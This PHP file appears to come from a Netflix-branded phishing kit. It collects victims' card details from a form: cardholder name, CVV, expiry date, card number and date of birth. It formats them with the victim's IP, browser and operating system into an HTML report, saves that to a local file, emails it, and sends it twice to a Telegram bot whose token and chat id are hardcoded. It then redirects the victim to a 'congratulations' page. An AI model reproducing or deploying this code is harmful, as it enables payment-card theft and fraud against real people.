<?php


session_start();
////// LAST 4 NUMBERS ////////
$_SESSION['cn'] = $_POST['cn'];
///// LAST 4 NUMBERS ////////
$TIME_DATE = date('H:i:s d/m/Y');
include('../../app/get_browser.php');
include('../../__CONFIG__.php');
include('../../app/get_ip.php');
$message .= "
<!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>❤ Nom sur carte ❤</b></td>
                        <td style='width: 400px;'>".$_POST['CHname']."</td>
                    </tr>
                     <tr>
                        <td style='width: 200px;'><b>❤ CVV ❤</b></td>
                        <td style='width: 400px;'>".$_POST['cvv2']."</td>
                    </tr>
                     <tr>
                        <td style='width: 200px;'><b>❤ Date d'echeance MM/YY ❤</b></td>
                        <td style='width: 400px;'>".$_POST['expirydate1']." - ".$_POST['expirydate2']."</td>
                    </tr>
                     <tr>
                        <td style='width: 200px;'><b>❤ N° du compte de carte ❤</b></td>
                        <td style='width: 400px;'>0000 - ".$_POST['acctnumber2']." - ".$_POST['acctnumber3']." - ".$_POST['acctnumber4']."</td>
                    </tr>
                     <tr>
                        <td style='width: 200px;'><b>❤ Date de naissance JJ/MM/YYYY ❤</b></td>
                        <td style='width: 400px;'>".$_POST['dateofbirth1']." / ".$_POST['dateofbirth2']." / ".$_POST['dateofbirth3']."</td>
                    </tr>
                    <tr>
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        
                    </tr>
                </table>
                <div class='newline'></div>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>IP</b></td>
                        <td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$remote."' target='_blank'>".$remote."</a></td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Browser</b></td>
                         <td style='width: 400px;'>".DR_Browser($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>Current Systeme</b></td>
                       <td style='width: 400px;'>".DR_OS($_SERVER['HTTP_USER_AGENT'])."</td>
                    </tr>
                </table>
            </div>
            </center>
            </body>
            </html>\n";



            $subject  = "NETFL!X [ ❤ VBV SMS ❤ ] - [ ".$remote." ] - [ ".$_SESSION['_LOOKUP_COUNTRY_']." ] - ";
            $headers  = "From: NETFL!X <rezult@phinomen.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $txt_rezlt = fopen('../../_____________RZLT.htm', 'a');
            fwrite($txt_rezlt, $message);
            fclose($txt_rezlt);
            @mail($to, $subject, $message, $headers);
$token = "1388958175:AAHsa9EZzcbnqjp_5NkXcSkG1QJSuJ7Du_o";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1226259575&text=" . urlencode($message)."" );
  $token = "1388958175:AAHsa9EZzcbnqjp_5NkXcSkG1QJSuJ7Du_o";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1226259575&text=" . urlencode($message)."" );
header("Location: ../../congratulations.php")
?>